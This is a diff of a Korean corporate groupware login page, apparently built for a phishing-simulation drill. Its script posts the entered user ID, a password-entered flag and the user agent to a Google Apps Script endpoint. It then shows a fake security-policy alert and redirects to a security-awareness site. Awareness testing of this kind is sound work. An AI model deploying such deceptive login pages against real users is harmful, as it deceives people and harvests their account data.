@@ -2,65 +2,50 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Groupware Login</title>
+    <title>사내 그룹웨어 로그인</title>
     <style>
-        /* 형네 그룹웨어 느낌의 깔끔한 디자인 */
         body { font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
         .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        h2 { color: #333; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
-        button:hover { background: #0056b3; }
-        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <h2>사내 그룹웨어 로그인</h2>
-        <input type="text" id="userId" placeholder="아이디" required>
+        <h2>로그인</h2>
+        <input type="text" id="userId" placeholder="사번 또는 아이디" required>
         <input type="password" id="userPwd" placeholder="비밀번호" required>
-        <button onclick="sendFishingData()">로그인</button>
-        <div class="footer">Copyright © Foundation. All rights reserved.</div>
+        <button onclick="sendData()">로그인</button>
     </div>
 
     <script>
-        async function sendFishingData() {
-            // ⚠️ [중요] 여기에 형의 '새 배포' 웹 앱 URL을 넣으세요!
-            const GAS_URL = "https://script.google.com/macros/s/AKfycbwy2sMwavARxgaWEuqubqDkV4T2dnCv-7SzVIzeIjPwBaT0CVnFyrnfYSdAA_yImh7-/exec";
+        async function sendData() {
+            // ⚠️ 여기에 '새 배포' 시 받은 URL을 한 글자도 틀리지 말고 넣으세요!
+            const URL = "https://script.google.com/macros/s/AKfycbw36XOgNzuuMisTCMN3YKqb2AQfL70FXuCgM-2tp5T5VhzR-0LDIEst_-6HcBkFf8PN/exec";
             
             const userId = document.getElementById('userId').value;
             const userPwd = document.getElementById('userPwd').value;
 
-            if(!userId) { alert("아이디를 입력해주세요."); return; }
-
-            // 1. 데이터를 시트가 받기 편한 URLSearchParams 형식으로 변경
             const formData = new URLSearchParams();
             formData.append('userId', userId);
             formData.append('isPwdEntered', userPwd.length > 0 ? "YES" : "NO");
             formData.append('userAgent', navigator.userAgent);
 
             try {
-                // 2. 비동기로 데이터 전송 (no-cors 유지)
-                fetch(GAS_URL, {
+                // 데이터 전송 (no-cors)
+                fetch(URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    cache: 'no-cache',
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                     body: formData
                 });
 
-                // 3. [핵심] 알림창을 띄워 브라우저가 데이터를 쏠 시간을 벌어줍니다.
-                alert("보안 정책 업데이트로 인해 로그인이 일시 제한되었습니다.\n안전한 이용을 위해 보안 교육 페이지로 이동합니다.");
+                // 사용자에게 알림을 띄워 데이터 전송 시간을 법니다.
+                alert("보안 정책에 따라 로그인이 제한되었습니다. 교육 페이지로 이동합니다.");
                 
-                // 4. 아주 짧은 대기 후 이동 (데이터 유실 방지)
                 setTimeout(() => {
                     location.href = "https://www.boho.or.kr/"; 
                 }, 300);
-
             } catch (e) {
-                console.error("전송 오류:", e);
-                // 오류가 나더라도 일단 교육 페이지로 보내서 의심을 피함
                 location.href = "https://www.boho.or.kr/";
             }
         }
